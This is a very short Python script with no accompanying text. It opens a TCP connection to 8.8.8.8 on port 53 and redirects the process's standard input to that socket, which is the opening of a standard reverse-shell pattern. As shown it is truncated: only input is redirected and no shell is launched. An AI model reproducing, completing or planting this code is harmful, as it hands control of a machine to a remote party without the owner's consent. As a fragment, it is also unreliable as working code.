#!/usr/bin/python3

import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("8.8.8.8", 53))
os.dup2(s.fileno(), 0)